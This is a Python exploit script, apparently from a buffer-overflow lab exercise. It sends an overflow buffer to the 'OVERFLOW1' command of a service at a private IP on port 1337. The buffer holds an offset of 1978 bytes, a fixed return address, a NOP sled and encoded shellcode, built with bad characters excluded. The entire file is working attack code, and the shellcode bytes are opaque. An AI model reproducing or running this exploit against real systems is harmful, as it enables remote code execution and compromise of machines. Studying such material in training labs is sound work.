import socket

ip = "10.10.172.174"
port = 1337
import struct


def p32(data):
  return struct.pack("<I", data)


allchars = bytearray(range(1,256))
badchars = [b"\x07", b"\x2e", b"\xa0"]

for badchar in badchars:
  allchars = allchars.replace(badchar,b"")

prefix = b"OVERFLOW1 "
offset = 1978
overflow = b"A" * offset
#0x625011bb
retn = p32(0x625011BB)
padding = b"\x90" * 24

buf =  b""
buf += b"\xdd\xc3\xba\x93\x4c\x9d\x9f\xd9\x74\x24\xf4\x58"
buf += b"\x29\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\xc3"
buf += b"\x5f\x7f\x6a\x1f\xb7\xfd\x95\xdf\x48\x62\x1f\x3a"
buf += b"\x79\xa2\x7b\x4f\x2a\x12\x0f\x1d\xc7\xd9\x5d\xb5"
buf += b"\x5c\xaf\x49\xba\xd5\x1a\xac\xf5\xe6\x37\x8c\x94"
buf += b"\x64\x4a\xc1\x76\x54\x85\x14\x77\x91\xf8\xd5\x25"
buf += b"\x4a\x76\x4b\xd9\xff\xc2\x50\x52\xb3\xc3\xd0\x87"
buf += b"\x04\xe5\xf1\x16\x1e\xbc\xd1\x99\xf3\xb4\x5b\x81"
buf += b"\x10\xf0\x12\x3a\xe2\x8e\xa4\xea\x3a\x6e\x0a\xd3"
buf += b"\xf2\x9d\x52\x14\x34\x7e\x21\x6c\x46\x03\x32\xab"
buf += b"\x34\xdf\xb7\x2f\x9e\x94\x60\x8b\x1e\x78\xf6\x58"
buf += b"\x2c\x35\x7c\x06\x31\xc8\x51\x3d\x4d\x41\x54\x91"
buf += b"\xc7\x11\x73\x35\x83\xc2\x1a\x6c\x69\xa4\x23\x6e"
buf += b"\xd2\x19\x86\xe5\xff\x4e\xbb\xa4\x97\xa3\xf6\x56"
buf += b"\x68\xac\x81\x25\x5a\x73\x3a\xa1\xd6\xfc\xe4\x36"
buf += b"\x18\xd7\x51\xa8\xe7\xd8\xa1\xe1\x23\x8c\xf1\x99"
buf += b"\x82\xad\x99\x59\x2a\x78\x0d\x09\x84\xd3\xee\xf9"
buf += b"\x64\x84\x86\x13\x6b\xfb\xb7\x1c\xa1\x94\x52\xe7"
buf += b"\x22\x91\xaa\xe2\xb8\xcd\xa8\xec\xb8\xdf\x24\x0a"
buf += b"\xaa\xcf\x60\x85\x43\x69\x29\x5d\xf5\x76\xe7\x18"
buf += b"\x35\xfc\x04\xdd\xf8\xf5\x61\xcd\x6d\xf6\x3f\xaf"
buf += b"\x38\x09\xea\xc7\xa7\x98\x71\x17\xa1\x80\x2d\x40"
buf += b"\xe6\x77\x24\x04\x1a\x21\x9e\x3a\xe7\xb7\xd9\xfe"
buf += b"\x3c\x04\xe7\xff\xb1\x30\xc3\xef\x0f\xb8\x4f\x5b"
buf += b"\xc0\xef\x19\x35\xa6\x59\xe8\xef\x70\x35\xa2\x67"
buf += b"\x04\x75\x75\xf1\x09\x50\x03\x1d\xbb\x0d\x52\x22"
buf += b"\x74\xda\x52\x5b\x68\x7a\x9c\xb6\x28\x9a\x7f\x12"
buf += b"\x45\x33\x26\xf7\xe4\x5e\xd9\x22\x2a\x67\x5a\xc6"
buf += b"\xd3\x9c\x42\xa3\xd6\xd9\xc4\x58\xab\x72\xa1\x5e"
buf += b"\x18\x72\xe0"

extra = b"C" * (5000 - len(prefix) - offset - len(padding) - len(retn) - len(buf))

postfix = ""

#buffer = prefix + overflow + retn + padding + payload + postfix
buffer = b"".join(
  [
    prefix,
    overflow,
    retn,
    padding,
    buf,
    extra
  ]
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer)
  print("Done!")
except:
  print("Could not connect.")